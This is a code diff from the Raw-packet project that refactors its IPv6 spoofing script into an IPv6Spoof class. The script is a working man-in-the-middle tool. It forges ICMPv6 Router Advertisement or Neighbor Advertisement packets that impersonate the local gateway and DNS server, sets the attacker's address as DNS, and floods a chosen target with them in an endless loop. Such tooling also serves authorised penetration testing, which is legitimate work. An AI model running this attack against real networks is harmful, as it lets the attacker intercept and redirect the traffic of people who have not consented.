@@ -12,7 +12,7 @@ Copyright 2020, Raw-packet Project
 
 # region Import
 from raw_packet.Utils.base import Base
-from raw_packet.Scanners.scanner import Scanner
+from raw_packet.Utils.utils import Utils
 from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
 from raw_packet.Utils.network import RawICMPv6, RawSend
 from argparse import ArgumentParser, RawTextHelpFormatter
@@ -30,6 +30,259 @@ __version__ = '0.2.1'
 __maintainer__ = 'Vladimir Ivanov'
 __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Development'
+__script_name__ = 'IPv6 Spoofing (ipv6_spoof)'
+# endregion
+
+
+# region class IPv6Spoof
+class IPv6Spoof:
+
+    # region Variables
+    _base: Base = Base()
+    _utils: Utils = Utils()
+    _icmpv6: RawICMPv6 = RawICMPv6()
+
+    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None, 'ipv6-link-address': None}
+    _target: Dict[str, Union[None, str]] = {'ipv6-address': None, 'mac-address': None, 'vendor': None}
+    _techniques: Dict[int, str] = {1: 'ICMPv6 RA (Router Advertisement) Spoofing',
+                                   2: 'ICMPv6 NA (Neighbor Advertisement) Spoofing'}
+    _technique_index: Union[None, int] = None
+    # endregion
+
+    # region Init
+    def __init__(self, network_interface: Union[None, str] = None) -> None:
+        """
+        Init
+        :param network_interface: Network interface name
+        """
+        self._your = self._base.get_interface_settings(interface_name=network_interface,
+                                                       required_parameters=['mac-address',
+                                                                            'ipv6-link-address'])
+        self._raw_send: RawSend = RawSend(network_interface=network_interface)
+        self._icmpv6_scan: ICMPv6Scan = ICMPv6Scan(network_interface=network_interface)
+    # endregion
+
+    # region Check IPv6 address
+    def _check_ipv6_address(self, 
+                            ipv6_address: str, 
+                            parameter_name: str = 'gateway IPv6 address') -> str:
+        
+        assert self._base.ipv6_address_validation(ipv6_address), \
+            'Bad ' + parameter_name.capitalize() + ': ' + \
+            self._base.error_text(ipv6_address) + \
+            '; Failed to validate ipv6 address!'
+        
+        assert str(ipv6_address).startswith('fe80::'), \
+            'Bad ' + parameter_name.capitalize() + ': ' + \
+            self._base.error_text(ipv6_address) + \
+            '; ' + parameter_name.capitalize() + \
+            ' must be starts with: ' + \
+            self._base.info_text('fe80::')
+        
+        assert ipv6_address != self._your['ipv6-link-address'], \
+            'Bad ' + parameter_name.capitalize() + ': ' + \
+            self._base.error_text(ipv6_address) + \
+            '; ' + parameter_name.capitalize() + \
+            ' is your Link local IPv6 address!'
+        
+        return ipv6_address
+    # endregion
+
+    # region Start IPv6 Spoofing
+    def start(self,
+              technique: Union[None, int] = None,
+              target_ipv6_address: Union[None, str] = None,
+              target_mac_address: Union[None, str] = None,
+              gateway_ipv6_address: Union[None, str] = None,
+              dns_ipv6_address: Union[None, str] = None,
+              dns_domain_search: str = 'domain.local',
+              ipv6_prefix: str = 'fde4:8dba:82e1:ffff::/64',
+              quit: bool = False):
+        try:
+            
+            # region Variables
+            gateway_mac_address: Union[None, str] = None
+            prefix: Union[None, str] = None
+            mtu: int = 1500
+            router_lifetime: int = 2
+            reachable_time: int = 2000
+            retrans_timer: int = 2000
+            advertisement_interval: int = 2000
+            # endregion
+            
+            # region Check gateway_ip and dns_ip
+
+            # region Search Gateway and DNS servers
+            router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = None
+            if gateway_ipv6_address is None and dns_ipv6_address is None:
+                self._base.print_info('Search IPv6 Gateway and DNS server ....')
+                router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = \
+                    self._icmpv6_scan.search_router(timeout=5, retry=3, exit_on_failure=False)
+
+                # region Find IPv6 router
+                if router_advertisement_data is not None:
+                    gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
+                    gateway_mac_address = router_advertisement_data['router_mac_address']
+                    if 'dns-server' in router_advertisement_data.keys():
+                        dns_ipv6_address = router_advertisement_data['dns-server']
+                    else:
+                        dns_ipv6_address = self._your['ipv6-link-address']
+                    if 'prefix' in router_advertisement_data.keys():
+                        prefix = router_advertisement_data['prefix']
+                    else:
+                        prefix = ipv6_prefix
+                    if 'mtu' in router_advertisement_data.keys():
+                        mtu = int(router_advertisement_data['mtu'])
+                # endregion
+
+                # region Could not find IPv6 router
+                else:
+                    gateway_ipv6_address = self._your['ipv6-link-address']
+                    gateway_mac_address = self._your['mac-address']
+                    prefix = ipv6_prefix
+                    dns_ipv6_address = self._your['ipv6-link-address']
+                # endregion
+
+            # endregion
+
+            # region Check arguments: gateway_ip and dns_ip
+            else:
+                # region Check argument: gateway_ip
+                if gateway_ipv6_address is not None:
+                    gateway_ipv6_address = self._check_ipv6_address(gateway_ipv6_address, 'Gateway IPv6 address')
+                # endregion
+
+                # region Check argument: dns_ip
+                if dns_ipv6_address is not None:
+                    dns_ipv6_address = self._check_ipv6_address(dns_ipv6_address, 'DNS server IPv6 address')
+                # endregion
+
+            # endregion
+
+            # region Print Gateway and DNS server information
+            self._base.print_success('Gateway IPv6 address: ', gateway_ipv6_address)
+            if gateway_mac_address is not None:
+                self._base.print_success('Gateway MAC address: ', gateway_mac_address)
+            if router_advertisement_data is not None:
+                self._base.print_success('Gateway Vendor: ', router_advertisement_data['vendor'])
+            if dns_ipv6_address is not None:
+                self._base.print_success('DNS IPv6 address: ', dns_ipv6_address)
+            self._base.print_success('IPv6 prefix: ', prefix)
+            self._base.print_success('MTU: ', str(mtu))
+            self._base.print_success('Router lifetime (s): ', str(router_lifetime))
+            self._base.print_success('Reachable time (ms): ', str(reachable_time))
+            self._base.print_success('Retrans timer (ms): ', str(retrans_timer))
+            # endregion
+
+            # endregion
+
+            # region Set technique
+            technique_pretty_table: PrettyTable = PrettyTable([self._base.info_text('Index'),
+                                                               self._base.info_text('ICMPv6 MiTM technique')])
+            for technique_key in self._techniques.keys():
+                technique_pretty_table.add_row([str(technique_key), self._techniques[technique_key]])
+
+            if technique is None:
+                self._base.print_info('ICMPv6 MiTM technique list:')
+                print(technique_pretty_table)
+                print(self._base.c_info + 'Select ICMPv6 MiTM technique index from range (1 - ' +
+                      str(len(self._techniques.keys())) + '): ', end='')
+                current_technique_index: str = input()
+                assert current_technique_index.isdigit(), \
+                    'ICMPv6 MiTM technique index is not digit!'
+                current_technique_index: int = int(current_technique_index)
+                assert not any([current_technique_index < 1, current_technique_index > len(self._techniques.keys())]), \
+                    'ICMPv6 MiTM technique index is not within range (1 - ' + str(len(self._techniques.keys())) + ')'
+                self._technique_index = current_technique_index
+
+            else:
+                assert int(technique) == 1 or int(technique) == 2, \
+                    'Bad technique index, technique must be: \n' + str(technique_pretty_table)
+                self._technique_index = int(technique)
+            # endregion
+
+            # region Set target
+            self._target = self._utils.set_ipv6_target(network_interface=self._your['network-interface'],
+                                                       target_ipv6_address=target_ipv6_address,
+                                                       target_mac_address=target_mac_address,
+                                                       exclude_ipv6_addresses=[gateway_ipv6_address])
+            # Check target IPv6 and gateway IPv6
+            assert self._target['ipv6-address'] != gateway_ipv6_address, \
+                'Bad target IPv6 address: ' + self._base.error_text(target_ipv6_address) + \
+                '; Target IPv6 address is gateway link local IPv6 address!'
+
+            # Print Target IPv6- and MAC-address
+            if not quit:
+                self._base.print_success('Target IPv6 address: ', self._target['ipv6-address'])
+                self._base.print_success('Target MAC address: ', self._target['mac-address'])
+                if self._target['vendor'] is not None:
+                    self._base.print_success('Target vendor: ', self._target['vendor'])
+            # endregion
+
+            # region Start spoofing
+            self._base.print_info('IPv6 Spoof: ', gateway_ipv6_address + ' -> ' + self._your['mac-address'])
+            spoof_packets: List[bytes] = list()
+
+            # region Use RA (Router Advertisement) technique
+            if self._technique_index == 1:
+                self._base.print_info('Send Router Advertisement packets to: ', 
+                                      self._target['ipv6-address'] + ' (' +
+                                      self._target['mac-address'] + ')')
+                self._base.print_info('Start Router Advertisement spoofing ...')
+                spoof_packets.append(
+                    self._icmpv6.make_router_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
+                                                                  ethernet_dst_mac=self._target['mac-address'],
+                                                                  ipv6_src=gateway_ipv6_address,
+                                                                  ipv6_dst=self._target['ipv6-address'],
+                                                                  dns_address=self._your['ipv6-link-address'],
+                                                                  domain_search=dns_domain_search,
+                                                                  prefix=prefix,
+                                                                  mtu=mtu,
+                                                                  src_link_layer_address=self._your['mac-address'],
+                                                                  router_lifetime=router_lifetime,
+                                                                  reachable_time=reachable_time,
+                                                                  retrans_timer=retrans_timer,
+                                                                  advertisement_interval=advertisement_interval))
+            # endregion
+
+            # region Use NA (Neighbor Advertisement) technique
+            if self._technique_index == 2:
+                self._base.print_info('Send Neighbor Advertisement packets to: ',
+                                      self._target['ipv6-address'] + ' (' +
+                                      self._target['mac-address'] + ')')
+                self._base.print_info('Start Neighbor Advertisement spoofing ...')
+                spoof_packets.append(
+                    self._icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
+                                                                    ethernet_dst_mac=self._target['mac-address'],
+                                                                    ipv6_src=gateway_ipv6_address,
+                                                                    ipv6_dst=self._target['ipv6-address'],
+                                                                    target_ipv6_address=gateway_ipv6_address))
+                if dns_ipv6_address != self._your['ipv6-link-address'] and dns_ipv6_address != gateway_ipv6_address:
+                    spoof_packets.append(
+                        self._icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
+                                                                        ethernet_dst_mac=self._target['mac-address'],
+                                                                        ipv6_src=dns_ipv6_address,
+                                                                        ipv6_dst=self._target['ipv6-address'],
+                                                                        target_ipv6_address=dns_ipv6_address))
+            # endregion
+
+            while True:
+                for spoof_packet in spoof_packets:
+                    self._raw_send.send(spoof_packet)
+                    sleep(0.25)
+            # endregion
+
+        except KeyboardInterrupt:
+            if not quit:
+                self._base.print_info('Exit')
+            exit(0)
+
+        except AssertionError as Error:
+            if not quit:
+                self._base.print_error(Error.args[0])
+            exit(1)
+    # endregion
+
 # endregion
 
 
@@ -38,7 +291,6 @@ def main():
 
     # region Import Raw-packet classes
     base: Base = Base()
-    icmpv6: RawICMPv6 = RawICMPv6()
     # endregion
 
     # region Check user, platform and create threads
@@ -46,281 +298,49 @@ def main():
     base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
     # endregion
 
+    # region Parse script arguments
+    script_description: str = \
+        base.get_banner() + '\n' + \
+        ' ' * (int((55 - len(__script_name__)) / 2)) + \
+        base.info_text(__script_name__) + '\n\n'
+    parser = ArgumentParser(description=script_description, formatter_class=RawTextHelpFormatter)
+    parser.add_argument('-T', '--technique', type=int, default=None,
+                        help='Set ICMPv6 MiTM technique (example: 1)' +
+                             '\n1. ICMPv6 RA (Router Advertisement) Spoofing' +
+                             '\n2. ICMPv6 NA (Neighbor Advertisement) Spoofing')
+    parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
+    parser.add_argument('-t', '--target_ip', help='Set target IPv6 link local address', default=None)
+    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
+    parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
+    parser.add_argument('-p', '--ipv6_prefix', help='Set IPv6 prefix, default="fde4:8dba:82e1:ffff::/64"',
+                        default='fde4:8dba:82e1:ffff::/64')
+    parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
+    parser.add_argument('-n', '--dns_domain_search', help='Set DNS domain search; default: "local"', default='local')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+    args = parser.parse_args()
+    # endregion
+
+    # region Print banner if argument quit is not set
+    if not args.quiet:
+        base.print_banner()
+    # endregion
+
+    # region Get your network settings
+    if args.interface is None:
+        base.print_warning('Please set a network interface for IPv6 Spoofing ...')
+    current_network_interface: str = base.network_interface_selection(args.interface)
+    # endregion
+
     try:
-
-        # region Parse script arguments
-        parser = ArgumentParser(description='ICMPv6 spoofing', formatter_class=RawTextHelpFormatter)
-        parser.add_argument('-T', '--technique', type=int, default=None,
-                            help='Set ICMPv6 MiTM technique (example: 1)' +
-                                 '\n1. ICMPv6 RA (Router Advertisement) Spoofing' +
-                                 '\n2. ICMPv6 NA (Neighbor Advertisement) Spoofing')
-        parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
-        parser.add_argument('-t', '--target_ip', help='Set target IPv6 link local address', default=None)
-        parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
-        parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
-        parser.add_argument('-p', '--ipv6_prefix', help='Set IPv6 prefix, default="fde4:8dba:82e1:ffff::/64"',
-                            default='fde4:8dba:82e1:ffff::/64')
-        parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
-        parser.add_argument('-n', '--dns_domain_search', help='Set DNS domain search; default: "local"',
-                            default='local')
-        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
-        args = parser.parse_args()
-        # endregion
-
-        # region Print banner if argument quit is not set
-        if not args.quiet:
-            base.print_banner()
-        # endregion
-
-        # region Get your network settings
-        if args.interface is None:
-            base.print_warning('Please set a network interface for sniffing ICMPv6 responses ...')
-        current_network_interface: str = base.network_interface_selection(args.interface)
-        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
-        your_ipv6_link_address: str = base.get_interface_ipv6_link_address(current_network_interface)
-        icmpv6_scan: ICMPv6Scan = ICMPv6Scan(network_interface=current_network_interface)
-        scanner: Scanner = Scanner(network_interface=current_network_interface)
-        raw_send: RawSend = RawSend(network_interface=current_network_interface)
-        # endregion
-
-        # region Local variables
-        techniques = {
-            1: 'ICMPv6 RA (Router Advertisement) Spoofing',
-            2: 'ICMPv6 NA (Neighbor Advertisement) Spoofing'
-        }
-        technique_index: int = 0
-        target_ipv6_address: Union[None, str] = None
-        target_mac_address: Union[None, str] = None
-        gateway_ipv6_address: Union[None, str] = None
-        gateway_mac_address: Union[None, str] = None
-        dns_ipv6_address: Union[None, str] = None
-        prefix: Union[None, str] = None
-        mtu: int = 1500
-        router_lifetime: int = 2
-        reachable_time: int = 2000
-        retrans_timer: int = 2000
-        advertisement_interval: int = 2000
-        # endregion
-
-        # region Check arguments: target_ip and target_mac
-
-        # region Check argument: target_mac
-        if args.target_mac is not None:
-            assert base.mac_address_validation(args.target_mac), \
-                'Bad value "-m, --target_mac": ' + base.error_text(args.target_mac) + \
-                '; Example MAC address: ' + base.info_text('12:34:56:78:90:ab')
-            target_mac_address = str(args.target_mac).lower()
-        # endregion
-
-        # region Set variable for scan results
-        target: Union[None, Dict[str, str]] = None
-        # endregion
-
-        # region Search targets in local network
-        if args.target_ip is None:
-            base.print_info('Search IPv6 alive hosts ....')
-            ipv6_devices = scanner.find_ipv6_devices(network_interface=current_network_interface, timeout=3, retry=3,
-                                                     exclude_ipv6_addresses=[gateway_ipv6_address])
-            # Target IPv6 and MAC address is not set
-            if target_mac_address is None:
-                target = scanner.ipv6_device_selection(ipv6_devices)
-                target_ipv6_address = target['ip-address']
-                target_mac_address = target['mac-address']
-
-            # Target MAC address is set but target IPv6 is not set
-            else:
-                for ipv6_device in ipv6_devices:
-                    if ipv6_device['mac-address'] == target_mac_address:
-                        target_ipv6_address = ipv6_device['ip-address']
-                assert target_ipv6_address is not None, \
-                    'Could not found IPv6 device with MAC address: ' + base.error_text(target_mac_address)
-        # endregion
-
-        # region Check argument: target_ip
-        else:
-            assert args.target_mac is not None, \
-                'Target IPv6 address is set. Please set target MAC address "-m, --target_mac"'
-            assert base.ipv6_address_validation(args.target_ip), \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + '; Failed to validate ipv6 address!'
-            assert str(args.target_ip).startswith('fe80::'), \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-                '; Target link local ipv6 address must be starts with: ' + base.info_text('fe80::')
-            assert args.target_ip != your_ipv6_link_address, \
-                'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-                '; Target IPv6 address is your link local IPv6 address!'
-            target_ipv6_address = args.target_ip
-        # endregion
-
-        # region Print Target information
-        base.print_success('Target IPv6 address: ', target_ipv6_address)
-        base.print_success('Target MAC address: ', target_mac_address)
-        if target is not None:
-            if isinstance(target, dict):
-                if 'vendor' in target.keys():
-                    base.print_success('Target Vendor: ', target['vendor'])
-        target = None
-        # endregion
-
-        # endregion
-
-        # region Set technique
-        technique_pretty_table = PrettyTable([base.info_text('Index'), base.info_text('ICMPv6 MiTM technique')])
-        for technique_key in techniques.keys():
-            technique_pretty_table.add_row([str(technique_key), techniques[technique_key]])
-
-        if args.technique is None:
-            base.print_info('ICMPv6 MiTM technique list:')
-            print(technique_pretty_table)
-            current_technique_index: str = input(base.c_info + 'Set ICMPv6 MiTM technique index from range (1 - ' +
-                                                 str(len(techniques.keys())) + '): ')
-            assert current_technique_index.isdigit(), \
-                'ICMPv6 MiTM technique index is not digit!'
-            current_technique_index: int = int(current_technique_index)
-            assert not any([current_technique_index < 1, current_technique_index > len(techniques.keys())]), \
-                'ICMPv6 MiTM technique index is not within range (1 - ' + str(len(techniques.keys())) + ')'
-            technique_index = current_technique_index
-        else:
-            assert int(args.technique) == 1 or int(args.technique) == 2, \
-                'Bad technique index, technique must be: \n' + str(technique_pretty_table)
-            technique_index = int(args.technique)
-        # endregion
-
-        # region General output
-        if not args.quiet:
-            base.print_info('Network interface: ', current_network_interface)
-            base.print_info('Your IPv6 address: ', your_ipv6_link_address)
-            base.print_info('Your MAC address: ', your_mac_address)
-        # endregion
-
-        # region Check arguments: gateway_ip and dns_ip
-
-        # region Search Gateway and DNS servers
-        router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = None
-        if args.gateway_ip is None and args.dns_ip is None:
-            base.print_info('Search IPv6 Gateway and DNS server ....')
-            router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = \
-                icmpv6_scan.search_router(timeout=5, retry=3, exit_on_failure=False)
-            # region Find IPv6 router
-            if router_advertisement_data is not None:
-                gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
-                gateway_mac_address = router_advertisement_data['router_mac_address']
-                if 'dns-server' in router_advertisement_data.keys():
-                    dns_ipv6_address = router_advertisement_data['dns-server']
-                else:
-                    dns_ipv6_address = your_ipv6_link_address
-                if 'prefix' in router_advertisement_data.keys():
-                    prefix = router_advertisement_data['prefix']
-                else:
-                    prefix = args.ipv6_prefix
-                if 'mtu' in router_advertisement_data.keys():
-                    mtu = int(router_advertisement_data['mtu'])
-            # endregion
-
-            # region Could not find IPv6 router
-            else:
-                gateway_ipv6_address = your_ipv6_link_address
-                gateway_mac_address = your_mac_address
-                prefix = args.ipv6_prefix
-                dns_ipv6_address = your_ipv6_link_address
-            # endregion
-
-        # endregion
-
-        # region Check arguments: gateway_ip and dns_ip
-        else:
-            # region Check argument: gateway_ip
-            if args.gateway_ip is not None:
-                assert base.ipv6_address_validation(args.gateway_ip), \
-                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
-                    '; Failed to validate ipv6 address!'
-                assert str(args.gateway_ip).startswith('fe80::'), \
-                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
-                    '; Gateway link local ipv6 address must be starts with: ' + base.info_text('fe80::')
-                assert args.gateway_ip != your_ipv6_link_address, \
-                    'Bad value "-g, --gateway_ip": ' + base.error_text(args.gateway_ip) + \
-                    '; Gateway IPv6 address is your Link local IPv6 address!'
-                gateway_ipv6_address = args.gateway_ip
-            # endregion
-
-            # region Check argument: dns_ip
-            if args.dns_ip is not None:
-                assert base.ipv6_address_validation(args.dns_ip), \
-                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + '; Failed to validate ipv6 address!'
-                assert str(args.dns_ip).startswith('fe80::'), \
-                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + \
-                    '; DNS link local ipv6 address must be starts with: ' + base.info_text('fe80::')
-                assert args.dns_ip != your_ipv6_link_address, \
-                    'Bad value "-d, --dns_ip": ' + base.error_text(args.dns_ip) + \
-                    '; DNS IPv6 address is your Link local IPv6 address!'
-                dns_ipv6_address = args.dns_ip
-            # endregion
-        # endregion
-
-        # region Print Gateway and DNS server information
-        base.print_success('Gateway IPv6 address: ', gateway_ipv6_address)
-        if gateway_mac_address is not None:
-            base.print_success('Gateway MAC address: ', gateway_mac_address)
-        if router_advertisement_data is not None:
-            base.print_success('Gateway Vendor: ', router_advertisement_data['vendor'])
-        if dns_ipv6_address is not None:
-            base.print_success('DNS IPv6 address: ', dns_ipv6_address)
-        base.print_success('IPv6 prefix: ', prefix)
-        base.print_success('MTU: ', str(mtu))
-        base.print_success('Router lifetime (s): ', str(router_lifetime))
-        base.print_success('Reachable time (ms): ', str(reachable_time))
-        base.print_success('Retrans timer (ms): ', str(retrans_timer))
-        # endregion
-
-        # region Check target IP and gateway IP
-        assert args.target_ip != gateway_ipv6_address, \
-            'Bad value "-t, --target_ip": ' + base.error_text(args.target_ip) + \
-            '; Target IPv6 address is gateway link local IPv6 address!'
-        # endregion
-
-        # endregion
-
-        # region Start spoofing
-        base.print_info('Spoof NDP table: ', gateway_ipv6_address + ' -> ' + your_mac_address)
-        spoof_packets: List[bytes] = list()
-
-        if technique_index == 1:
-            base.print_info("Send Router Advertisement packets to: ", target_ipv6_address +
-                            " (" + target_mac_address + ")")
-            base.print_info("Start Router Advertisement spoofing ...")
-            spoof_packets.append(icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
-                                                                         ethernet_dst_mac=target_mac_address,
-                                                                         ipv6_src=gateway_ipv6_address,
-                                                                         ipv6_dst=target_ipv6_address,
-                                                                         dns_address=dns_ipv6_address,
-                                                                         domain_search=args.dns_domain_search,
-                                                                         prefix=prefix,
-                                                                         mtu=mtu,
-                                                                         src_link_layer_address=your_mac_address,
-                                                                         router_lifetime=router_lifetime,
-                                                                         reachable_time=reachable_time,
-                                                                         retrans_timer=retrans_timer,
-                                                                         advertisement_interval=advertisement_interval))
-
-        if technique_index == 2:
-            base.print_info('Send Neighbor Advertisement packets to: ', target_ipv6_address +
-                            ' (' + target_mac_address + ')')
-            base.print_info('Start Neighbor Advertisement spoofing ...')
-            spoof_packets.append(icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
-                                                                           ethernet_dst_mac=target_mac_address,
-                                                                           ipv6_src=gateway_ipv6_address,
-                                                                           ipv6_dst=target_ipv6_address,
-                                                                           target_ipv6_address=gateway_ipv6_address))
-            if dns_ipv6_address != your_ipv6_link_address and dns_ipv6_address != gateway_ipv6_address:
-                spoof_packets.append(icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
-                                                                               ethernet_dst_mac=target_mac_address,
-                                                                               ipv6_src=dns_ipv6_address,
-                                                                               ipv6_dst=target_ipv6_address,
-                                                                               target_ipv6_address=dns_ipv6_address))
-        while True:
-            for spoof_packet in spoof_packets:
-                raw_send.send(spoof_packet)
-                sleep(0.25)
-        # endregion
+        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=current_network_interface)
+        ipv6_spoof.start(technique=args.technique,
+                         target_ipv6_address=args.target_ip,
+                         target_mac_address=args.target_mac,
+                         gateway_ipv6_address=args.gateway_ip,
+                         dns_ipv6_address=args.dns_ip,
+                         dns_domain_search=args.dns_domain_search,
+                         ipv6_prefix=args.ipv6_prefix,
+                         quit=args.quiet)
 
     except KeyboardInterrupt:
         base.print_info('Exit')
